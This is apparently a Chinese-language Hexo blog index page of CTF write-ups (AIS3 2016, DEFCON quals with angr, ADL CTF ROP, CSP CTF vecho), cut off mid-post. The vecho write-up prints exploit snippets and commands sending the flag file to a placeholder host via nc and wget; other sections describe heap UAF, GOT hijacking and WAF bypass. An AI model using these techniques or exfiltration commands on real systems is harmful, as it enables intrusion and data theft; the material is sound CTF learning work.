@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Work</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Work">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Work">
+<meta property="og:locale" content="zh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Work">
+  
+    <link rel="alternate" href="/atom.xml" title="Work" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Work</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Blog-Migrated" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/22/Blog-Migrated/" class="article-date">
+  <time datetime="2019-06-22T02:15:58.150Z" itemprop="datePublished">2019-06-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/22/Blog-Migrated/">搬家</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最早覺得自己管理有點麻煩，從 hexo 搬到 logdown, 結果好像跟某人有關的創業都炸了，只好再搬回來，不過好久沒東西可以 PO 了，畢業後過了一整年半社畜生活 ORZ。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/06/22/Blog-Migrated/" data-id="cjx6w3gsp0000ohvqmjuotkzs" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-AIS3-2016-pre-exam" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/07/14/AIS3-2016-pre-exam/" class="article-date">
+  <time datetime="2016-07-14T09:28:47.000Z" itemprop="datePublished">2016-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/07/14/AIS3-2016-pre-exam/">AIS3 2016 pre-exam</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1pt"><a href="#1pt" class="headerlink" title="1pt"></a>1pt</h3><p>直接給 flag</p>
+<h3 id="2pt"><a href="#2pt" class="headerlink" title="2pt"></a>2pt</h3><p>用 xxd 看可以看到 header 有 7Z</p>
+<p>修正成 7z 後用 <code>7z l UNPACK_ME</code></p>
+<p>可以確定是 7z file with password, 包非常多層的 7z compressed file</p>
+<p>看到有個 size 0 檔名亂數的檔案 當作密碼可以解開第一層 7z</p>
+<p>之後每一層都有 secret.txt 裡面有下一層的密碼</p>
+<p>寫個 script 跑 總共有 1000 層</p>
+<h3 id="3pt"><a href="#3pt" class="headerlink" title="3pt"></a>3pt</h3><p>讓你打包一個 guess.txt 檔案上傳 server 用 sha1 檢查 hash 跟 flag 是否一樣</p>
+<p>傳一個 symbol link link 到 flag 身上即可</p>
+<hr>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="1pt-1"><a href="#1pt-1" class="headerlink" title="1pt"></a>1pt</h3><p>xor 加密找加密 key</p>
+<p>觀念是嘗試不同的 key 長度 一個一個 byte 去解密 讓他整個檔案出來是 printable</p>
+<p>有<a href="https://wiremask.eu/tools/xor-cracker/" target="_blank" rel="noopener">線上工具</a></p>
+<h3 id="2pt-1"><a href="#2pt-1" class="headerlink" title="2pt"></a>2pt</h3><p>這種讓你提供輸入但是要附上輸入的 hash 有種攻擊叫 length-extension attack</p>
+<p>有類似題目的 script</p>
+<p>後面 append 合法的 expire 即可</p>
+<h3 id="3pt-1"><a href="#3pt-1" class="headerlink" title="3pt"></a>3pt</h3><p>好像叫做 Batch GCD Attack</p>
+<p>就是 rsa 的 n 共用到同一個植樹的話用 GCD 可以很容易質因數分解出 n</p>
+<p>但這題目裡有很多組 n 可以被分解 所以都要試試看</p>
+<p>另外是這一題的 exponent 不適常用的 65537 這一點我很後面才發現</p>
+<p>以後要先讀清楚 key 資訊</p>
+<p><code>openssl rsa -noout -text -inform PEM -in pub/1.pub -pubin</code></p>
+<p><code>Exponent: 179424787 (0xab1ce13)</code></p>
+<hr>
+<h2 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY"></a>BINARY</h2><h3 id="1pt-2"><a href="#1pt-2" class="headerlink" title="1pt"></a>1pt</h3><p>直接上 angr </p>
+<script src="https://gist.github.com/leepupu/a43dfde79d46ccbb53c77e1d81687c63.js"></script>
+
+<h3 id="2pt-2"><a href="#2pt-2" class="headerlink" title="2pt"></a>2pt</h3><p>這一題轉成 binary file 後用工具看 開頭挺誤導的 還以為是要轉換順序之類的</p>
+<p>後來隨便 google 一下裡面的 bytes 查到 asm opcode 立馬開 ida 把 binary file 解成 asm code</p>
+<p>發現是 xor 解密的 asm 手動就能解開了</p>
+<h3 id="3pt-2"><a href="#3pt-2" class="headerlink" title="3pt"></a>3pt</h3><p>一樣上 angr (稍微會用 angr 之後都不用動腦了呢)</p>
+<hr>
+<h2 id="REMOTE-pwn"><a href="#REMOTE-pwn" class="headerlink" title="REMOTE (pwn)"></a>REMOTE (pwn)</h2><h3 id="1pt-3"><a href="#1pt-3" class="headerlink" title="1pt"></a>1pt</h3><p>用 time(0) 去 srand ，只要和 server 時間差不超過一秒的得到的 rand() 序列會相同</p>
+<script src="https://gist.github.com/leepupu/47c1df7e1c2b2444752d89c854cc43bc.js"></script>
+
+<h3 id="2pt-3"><a href="#2pt-3" class="headerlink" title="2pt"></a>2pt</h3><p>常見的 scanf 錯誤，參數直接傳入變數而非變數地址</p>
+<p>由於 stack 中的殘渣內容會在前面的動作決定，所以可以控制變數內容，直接對GOT地址寫入噴FLAG的地址</p>
+<p>推薦使用 qira 可以很快找到 stack 內容變化跟偏移</p>
+<p>‘</p>
+<h3 id="3pt-3"><a href="#3pt-3" class="headerlink" title="3pt"></a>3pt</h3><p>不用碰到 libc 的 heap 題，用 checksec 檢查會發現沒有開 NX ， 估計是能用 shellcode ，玩一下程式，功能大致如下</p>
+<ul>
+<li>一開始有讀入 .bss buffer 可以塞東西</li>
+<li>student struct 內有 function pointer</li>
+<li>note malloc size 可控</li>
+<li>note point 存在 array 中，能 free pointer</li>
+</ul>
+<p>一開始的 buffer 是在 bss 上面地址已知,可放入 shellcode ，之後跳 bss 地址即可。</p>
+<p>接著找找看 bug, 發現在 free note 之後並沒有將 note array 中 entry 清空，可能導致 UAF, double free 等等問題</p>
+<p>因為 student 中有 function pointer, 嘗試將兩個 struct 重疊然後直接寫入 function pointer 到 bss 上面。</p>
+<p>這邊倒推想一下：</p>
+<p>目標為覆蓋 <code>current_student</code> 上面的 function pointer =&gt; 寫入 note 時改寫到 pointer</p>
+<p>讓 note struct 疊合 <code>current_student</code> ，首先看一下 note create 是 malloc 出 note buffer 後直接寫入內容 =&gt; 必須讓 note malloc 出<code>current_student</code>的位址(或重疊的地址)</p>
+<p>為了讓 malloc 出 <code>current_student</code> 的位置，首先 malloc 的 size 要跟 student 一樣，而且 student 那一塊 chunk 要是 free 的</p>
+<p>然而並沒有 free student 的功能, 所以先建立並馬上釋放一個 note ， size 跟 student 一樣，如此一來 notes array 第一個格子就是 heap 下一次 malloc 同樣 size 會被拿出的 pointer</p>
+<p>然後建立 student ，這時 <code>current_student</code> 會跟 notes array 第一格相同，也就是剛剛 free 掉的地址</p>
+<p>接著為了要讓 note malloc 再度拿出相同的地址，必須要再 free 一次第一個 note, 因為此時這個 pointer 是被 <code>current_student</code> 使用的</p>
+<p>free 完後再 create note with same size 馬上又會拿出和 <code>current_student</code> 相同的 pointer</p>
+<p>對此 note 寫入即是覆蓋 student struct</p>
+<p>改寫 function pointer 後選 menu 2 <code>Show a student</code> 會 call function pointer 指向的地方</p>
+<script src="https://gist.github.com/leepupu/38cf887e5ab1a364e2a796e0e73423f7.js"></script>
+
+<hr>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1pt-4"><a href="#1pt-4" class="headerlink" title="1pt"></a>1pt</h3><p>robots.txt</p>
+<h3 id="2pt-4"><a href="#2pt-4" class="headerlink" title="2pt"></a>2pt</h3><p>header 偽造 src ip</p>
+<p>以下都設定為 127.0.0.1</p>
+<p>`HTTP_X_FORWARDED_FOR</p>
+<p>HTTP_CLIENT_IP</p>
+<p>HTTP_X_FORWARDED</p>
+<p>HTTP_X_CLUSTER_CLIENT_IP</p>
+<p>HTTP_FORWARDED_FOR</p>
+<p>HTTP_FORWARDED`</p>
+<h3 id="3pt-4"><a href="#3pt-4" class="headerlink" title="3pt"></a>3pt</h3><p>講一下找 function bug 想法</p>
+<p>首先可以下載 php source, p=../download.php 看到裡面有 include waf.php，</p>
+<p>waf.php 使用字串解析把 url 的 query 不分拆成 key=&gt;value 然後對黑名單驗證，</p>
+<p>由於有用 <code>file_exists</code> 檢查檔案名稱，無法在檔名部分塞東西或編碼，</p>
+<p>仔細看一下 waf.php 做的事情跟從 <code>$_GET</code> 取值檢查有87%像，特別自己分析大概就是分析的地方有問題，</p>
+<p>比對部分有用 <code>===</code> 所以不是 PHP 常見的比較問題，接著就開始朝 php function bug 部分 google。</p>
+<p>發現用 <code>parse_url bug</code> google 可以發現各種歷年來的 BUG ，將時間限定一年內可以在前幾筆看到 <a href="http://stackoverflow.com/questions/34020735/parse-url-does-not-parse-a-specific-url" target="_blank" rel="noopener">這一篇</a></p>
+<p>於是用 <code>?p=../flag.php&amp;amp;a=ss:88888</code> 便可以拿到 flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/14/AIS3-2016-pre-exam/" data-id="cjx6w1jrv0001l6vqzcj221zh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-DEFCON-Qualifier-Reverse-amadhj-by-angr" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/12/DEFCON-Qualifier-Reverse-amadhj-by-angr/" class="article-date">
+  <time datetime="2016-06-12T05:12:44.000Z" itemprop="datePublished">2016-06-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/12/DEFCON-Qualifier-Reverse-amadhj-by-angr/">DEFCON Qualifier Reverse amadhj by angr</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>比賽時用 python 重寫各個 function，然後嘗試用 z3 解，但不知為何，每個 char 加上限制後 check 都 unsat 。</p>
+<p>賽後 lays 大大研究了 KLEE 的解法 <a href="http://blog.l4ys.tw/2016/05/defcon-ctf-quals-2016-amadhj/" target="_blank" rel="noopener">link</a></p>
+<p>因為最近在看 angr ，就用 angr 試著解解看此題</p>
+<p>這題看起來就是標準 symbolic solve 題</p>
+<p>有個主要的 check function 參數是一 32 bytes buffer</p>
+<p>在 check function 裡 read(0, buf, 32)</p>
+<p>input 32 bytes, 分成 4 * qword 丟到 4 個function 算一算後 xor 再一起，與 const 比對，檢查結果</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/736942/9PCynJuIRGy3wYbIy4wp_TT.png)</figure>
+
+<h2 id="解題"><a href="#解題" class="headerlink" title="解題"></a>解題</h2><p>angr 底層也有用 z3 當 solve engine ， 所以最重要的是讓 angr 把 constrain 建立起來</p>
+<p>透過兩個 angr example 可以發現有沒有指定 symbolic symbol 的大小，速度差很多</p>
+<p><a href="https://github.com/angr/angr-doc/tree/master/examples/defcon2016quals_baby-re_1" target="_blank" rel="noopener">baby-re solve1</a></p>
+<p><a href="https://github.com/angr/angr-doc/tree/master/examples/defcon2016quals_baby-re_0" target="_blank" rel="noopener">baby-re solve2</a></p>
+<p>試著用 hook read 方式指定 sybolic symbol</p>
+<figure class="figure-code code"><div class="highlight"><pre>def patch_read(s):
+    global concated_str
+    print 'patch'
+    t = []
+    for i in range(4):
+        inp = s.se.BVS('usr_input', 8*8) # QWORD
+        s.memory.store(s.regs.rsi+8*i, inp)
+        t.append(inp)
+
+<pre><code>gsss.append(claripy.Concat(*t))
+return</code></pre><p></p></pre></div><p></p>
+</figure>
+
+<p>state 從 check function 開始跑</p>
+<p>指定好 find(compare success), avoid(compare fail) 後，剩下的就交給 explorer 去跑</p>
+<figure class="figure-code code"><div class="highlight"><pre>def exp():
+    global concated_str
+    path = b.factory.path(state=s)
+    ex = b.surveyors.Explorer(start=path, find=(0x040287F,), avoid=(0x0402886,), enable_veritesting=True)
+    ex.run()
+    if ex.found:
+            print "found"
+            for ss in concated_str:
+                print ex.found[0].state.se.any_str(ss)
+</pre></div>
+</figure>
+
+<p>-重要的是 check function 的參數要固定, hook 的 symbolic symbol 才會放在對的地方</p>
+<figure class="figure-code code"><div class="highlight"><pre>b = angr.Project('./amadhj')
+b.hook(0x4026FD, patch_read, length=5)
+s = b.factory.blank_state(addr=test_func)
+s.regs.rdi = 0x1000 # make sure symbolic symbol at same location
+</pre></div>
+</figure>
+
+<p>或者是可以直接在 state 裡面放 symbolic symbol 然後讓 check function 的參數指過去，這樣的話 hook function 直接 return  即可</p>
+<p><a href="https://gist.github.com/leepupu/01ae2064ddc50aea9ff0d59061da1e38" target="_blank" rel="noopener">python script</a></p>
+<p>跑約十幾分鐘會有結果</p>
+<figure class="figure-code code"><div class="highlight"><pre>DEBUG   | 2016-06-12 13:11:09,750 | angr.surveyors.explorer | Avoiding path &lt;Path with 738 runs (at 0x402886)&gt;.
+DEBUG   | 2016-06-12 13:11:09,752 | angr.surveyors.explorer | Done because we have no active paths left!
+found
+
+<p>A PrFURjDMboQJ ScKvoH cDl  BQDqp</p>
+<p></p></pre></div><p></p>
+</figure>
+
+<p><a href="http://docs.angr.io/docs/toplevel.html" target="_blank" rel="noopener">angr docs</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/06/12/DEFCON-Qualifier-Reverse-amadhj-by-angr/" data-id="cjx6w1js00004l6vqorjxzbr6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ADL-CTF-2015-SimpleEcho2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/03/27/ADL-CTF-2015-SimpleEcho2/" class="article-date">
+  <time datetime="2016-03-27T01:22:58.000Z" itemprop="datePublished">2016-03-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/27/ADL-CTF-2015-SimpleEcho2/">ADL CTF 2015 - SimpleEcho2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>這一題延續 project1 題目： SimpleEcho </p>
+<p>改成本身實作 socket server 由 fork 出的 handler function echo </p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/369965/yKegIfCBTfCWkvsvAKkG_Q.jpg)</figure>
+
+<p>這題是 x64 的 binary, calling convention 有一些參數是放在 register 在 rop 時要特別注意</p>
+<p>漏洞一樣是在 buffer 大小比 read 長度限制還小 這題有開各種保護</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/369965/EHIWyt5HQjmyAVzfZHqL_Q2.jpg)</figure>
+
+<p>要進行ROP首先要能控制 ret adr, 再有 canary 保護之下控制 ret adr 要先能把 canary 蓋回去</p>
+<p>拿 canary 的方式跟 SimpleEcho 一樣 先把 buffer 塞到 canary 的第一個 byte (經觀察都是 0 要避免截斷) 之後 echo 出來的內容就有 canary</p>
+<h2 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h2><p>接下來還有一些要克服的問題</p>
+<pre><code>1\. 有開 PIE 要拿到 binary load base 必須先拿到相對 offset</code></pre><ol>
+<li>題目 IO 是用 socket 連接 也就是 stdio 並沒有被 redirect to 我們建立的 socket</li>
+<li>payload 的長度還是受到 read size 的限制 (256)</li>
+</ol>
+<p>第一點用 overflow echo 回 EchoServer 的 ret adr 便可以算出 loading base</p>
+<p>能 overflow 到的地方都沒有 libc 相關的 address, 只好透過讀 got 拿 libc base 出來。</p>
+<p>拿的方法是用 rop ret to sendMsg, socket fd 在 stack overflow 的到的地方，把 got 內容 send 回來</p>
+<p>因為 service 是 fork 出來的 所以每次連 libc, loading base 都會固定，所以我由 exit ret to ROP chain 拿到 base adr 後直接 reconnect</p>
+<p>接著我原本想直接 ret to system, 或 rop syscall execv 甚至真的把 payload 都寫出來了，但 shell 只能開在 host 上，原因便是上面第二點</p>
+<p>這邊我打算 got hiject strlen 讓 host 收到 input 直接當 cmd 跑</p>
+<p>理論上直接寫入 got 就 OK 但我寫入時一直 Seg fault, 看一下 maps 竟然沒有 write </p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/369965/8zud3K3RRAHMZSLO4Ncw_G3.jpg)</figure>
+
+<p>只好先 rop mprotect 修改，再 hiject 這過程又會碰上第三點的問題 只好第一段 payload 最後先 ret 回 EchoServer 再送第二段</p>
+<p>完整 pwn python script</p>
+<p><a href="https://gist.github.com/leepupu/338503f2465a7c28c54e" target="_blank" rel="noopener">https://gist.github.com/leepupu/338503f2465a7c28c54e</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/03/27/ADL-CTF-2015-SimpleEcho2/" data-id="cjx6w1jrt0000l6vqjzp3bgu3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CSP-CTF-pwn-40-vecho" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/02/01/CSP-CTF-pwn-40-vecho/" class="article-date">
+  <time datetime="2016-02-01T11:47:17.000Z" itemprop="datePublished">2016-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/02/01/CSP-CTF-pwn-40-vecho/">CSP CTF pwn 40 - vecho</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>這題是一個 socket server，連線進來 frok handler 不斷 echo input 回去</p>
+<p>echo 的東西是 input sprintf 出來的 有 fmt 洞，但擋掉了 ‘n’ 也就是不給寫入</p>
+<p>解這一題走了許多彎路，花了超久，但也因此用了一些沒用過的 pwntools 工具： DynELF</p>
+<p>handler function:</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/uWMiX4rVSymDLciIOvoe_vecho2.jpg)</figure>
+
+<p>echo function:</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/LjQXY06QSuuNho6K3GwY_vecho1.jpg)</figure>
+
+<h2 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h2><h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><p>依照 hint, DEP 沒開，還有 overflow 提示，但因為 ADL 那一題的慣性 讓我一直想 hiject strcmp, 所以為了拿 libc 地址，開始研究 DynELF</p>
+<p>用法大概如下，其中 ret_of_main 為某一在 libc 中的地址，我是從 stack 中拿 retrutn address of main</p>
+<p>DynELF 會先往上找出 loading base, 接著幫你分辦一下 libc ver 然後找出 symbol 地址</p>
+<figure class="figure-code code"><div class="highlight"><pre>d = DynELF(leak, ret_of_main)
+system_adr = d.lookup('system', 'libc')
+</pre></div>
+</figure>
+
+<p>leak 為一個 洩漏任意地址 callback function 因為 fmt buf 在 stack 上，可以拿來利用</p>
+<p>要注意的是因為 sprintf 過去的 buf 有可能會 overflow 導至 handler 壞掉， DynELF 卡住 所以要用%xs控制一下讀出的 mem 長度，還有就是讀出來沒東西(‘\x00’)的情況也要處理到。</p>
+<figure class="figure-code code"><div class="highlight"><pre>payload = "%{}$.8sxxxx\x00".format(ped+3)+p32(adr)
+</pre></div>
+</figure>
+
+<p>完整的 leak function:</p>
+<figure class="figure-code code"><div class="highlight"><pre>def leak(adr):
+    if adr &lt; 0x08048000:
+        return ''
+    global ped, r # pedding in stack point to head of input buffer, and r for remote conn
+    # big problem is buffer of sprintf isn't long enought, %s may too long and will crash handler
+    # also, sprintf eat input str end of \x00, but address of page align always contains \x00, 
+    # to avoid cutting of payload, just put address after fmt payload, recv will still recv to buffer(in stack)
+    payload = "%{}$.8sxxxx\x00".format(ped+3)+p32(adr)
+    r.send(payload)
+    time.sleep(0.02)
+    r.recvuntil('Type string to echo back: ')
+
+<pre><code>s = r.recvuntil(&apos;xx&apos;)
+if len(s) == 8: # recv did not contain any mem data
+    return &apos;\x00&apos;
+rtn = (s[6:s.index(&apos;xx&apos;)]) # ret of echo is str in format &apos;Echo: &apos; + xxx
+return rtn</code></pre><p></p></pre></div><p></p>
+</figure>
+
+<h3 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h3><h4 id="First-try"><a href="#First-try" class="headerlink" title="First try"></a>First try</h4><p>YA! 拿到 system address 了。。。 好像不能做啥</p>
+<p>GOT Hiject?</p>
+<p>%n 被 filte 掉了無法寫入</p>
+<p>ret to libc?</p>
+<p>嗯。。來試試看，首先 echo 內的 recv buf 並沒有 overflow 的可能, recv 的大沒沒有比 buf 大</p>
+<figure class="figure-code code"><div class="highlight"><pre>char s[64];
+。。。
+if ( recv(fd, s, 63u, 0) )
+</pre></div>
+</figure>
+
+<p>回頭看一下 sprintf 去的 buf, 是在 echoServer 的 stack frame 中，大小 128 經過 sprintf 可用 $nc 來 overflow</p>
+<p>stack 長這様</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/z06KrtnT4CwSbjJn0qmU_IMG_20151221_112710.jpg)</figure>
+
+<p>要蓋的是 echoServer 的 return address payload 可以長這様</p>
+<figure class="figure-code code"><div class="highlight"><pre>payload = pa_n_c(128-6)+'g'+s_canary[1:]+pa_n_c(0x18+4)+p32(system_adr)+'aaaa'+p32(p_buf)
+# aaaa for fake ret of system
+send..
+payload = pa_n_c(128-6) # overwrite 'g' to \x00
+send..
+</pre></div>
+</figure>
+
+<p>但馬上遇到問題，sock fd 被蓋到 無法再收發 data</p>
+<p>如果要把 ‘aaaa’ 改成 fd 又會因為 fd 太小 p32 中有 \x00 導致後面被截斷</p>
+<p>這邊卡了許久~</p>
+<h4 id="Try-again"><a href="#Try-again" class="headerlink" title="Try again"></a>Try again</h4><p>後來突然想到 hint DEP 沒開，那我還不 ret to stack 跑我精心制做的 asm code, 於是我好興奮地用了 pwntools 的 asm</p>
+<figure class="figure-code code"><div class="highlight"><pre>asmc = "push {}\n"
+asmc += "push {}\n"
+asmc += "push {}\n"
+asmc += "ret\n"
+asmc = asm.format(poi_buf, fake_ret, system_addr)
+
+<p>asmc = asm(asmc)<br></p></pre></div><p></p>
+</figure>
+
+<p>接著是一段漫長的 debug 時光，我用 gdb set follow-fork-mode child 看了許多遍，都正確 ret to system, 同時 esp+4 也 point 到 我給的 cmd, 至少 x/s 出來有</p>
+<p>但 cmd 卻始終沒有跑起來 甚至 system 都 return 回 fake_ret 了</p>
+<p>想了好久才開始猜是不是 system 把我的 cmd 吃了。。。 嘗試先 add esp</p>
+<p>但直接 add esp, 0xN 的 machine code 是把 0xN 以 little endian, dwork 方式包在 machine code 中</p>
+<p>只好繞來繞去 避開 machine code 中出現 \x00</p>
+<figure class="figure-code code"><div class="highlight"><pre>inc ecx
+inc ecx
+inc ecx
+imul ecx, ecx
+imul ecx, ecx
+add esp, ecx
+</pre></div>
+</figure>
+
+<p>然後就可以塞 cmd 了 一開始用 touch /tmp/xxx 可以 work 後馬上嘗試用 cat /home/ctf/flag | nc x.x.x.x y</p>
+<p>想當然爾不能動… 最有問題的是 nc 中有 n …….</p>
+<p>還有就是我一開始串的方法是 </p>
+<figure class="figure-code code"><div class="highlight"><pre>cmd = code+"cat ...."
+</pre></div>
+</figure>
+
+<p>也就是 machine code 長度 + 指令長度 不能超過 63(echo 的 buf)</p>
+<p>但光是 ip 就至少 15 bytes, path 就 14 bytes, 還要預留 exit 的空間等等 總之就是不夠</p>
+<p>所以分兩次塞 先把指令塞到 echoServer 128 buffer 後半部 (%xc+cmd)</p>
+<p>再塞 machine code</p>
+<p>指令部分改成 wget x.x.x.x:y/?<code>cat /home/ctf/flag</code></p>
+<p>接著又因為 stack 拉不夠遠又把指令吃掉撞牆了一陣子 後來在加一次 add esp, ecx 後終於成功了</p>
+<h2 id="大大的解法"><a href="#大大的解法" class="headerlink" title="大大的解法"></a>大大的解法</h2><p>根據 meh 大大表示 asm code 跑 dup2(fd, 0) dup2(fd, 1) 就好啦</p>
+<p>。。。嗯 原來有 dup2 可以用</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/02/01/CSP-CTF-pwn-40-vecho/" data-id="cjx6w1jrz0003l6vq92lvxitt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Puzzle-Dragon-Helper" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/02/01/Puzzle-Dragon-Helper/" class="article-date">
+  <time datetime="2016-02-01T11:44:04.000Z" itemprop="datePublished">2016-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/02/01/Puzzle-Dragon-Helper/">Puzzle &amp; Dragon Helper</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="PAD輔助程式"><a href="#PAD輔助程式" class="headerlink" title="PAD輔助程式"></a>PAD輔助程式</h2><p>Puzzle &amp; Dragon <s>外掛</s> 輔助程式 written in java</p>
+<p>斷斷續續開發三年作品 從原始的 awt gui =&gt; web ui</p>
+<p>嘗試各種算法( Gene Algo, A<em>, BFS) 到持續優化 A</em></p>
+<p>從顏色判定到 OpenCV 也玩得很久了XD</p>
+<ol>
+<li>自動辨識盤面, 適應 4<em>5, 5</em>6, 6*7 …</li>
+<li>自動計算最佳傷害 (自訂隊伍設定 包刮 2way 隊長技)</li>
+<li>幫你轉</li>
+</ol>
+<figure>![](http://i.imgur.com/wcJeqR0.png)</figure>
+
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/307135/MtC1fDBOTJSyjoEnnf9d_TEAM.jpg)</figure>
+
+<p>另外還有 PAD MITM Project 可以無限接關 刷掉蛋 關卡替換等等 </p>
+<ul>
+<li>2015-10-31 更新: 暗版面判斷 對比暗化參數自動適應版面  下波 RANK 地下城試用看看</li>
+<li>2016-1-30 更新: 隊伍設定介面<figure>![](http://i.imgur.com/lIyVAkb.png)</figure>
+
+</li>
+</ul>
+<iframe width="420" height="315" src="https://www.youtube.com/embed/xghIIzpNMmI" frameborder="0" allowfullscreen></iframe>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/02/01/Puzzle-Dragon-Helper/" data-id="cjx6w1js60007l6vq4ltu3uad" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-HITCON-2015-unreadable-steg100" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/23/HITCON-2015-unreadable-steg100/" class="article-date">
+  <time datetime="2015-12-23T12:03:59.000Z" itemprop="datePublished">2015-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/23/HITCON-2015-unreadable-steg100/">HITCON 2015 - unreadable [steg100]</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><blockquote>
+<p>Can you read me?</p>
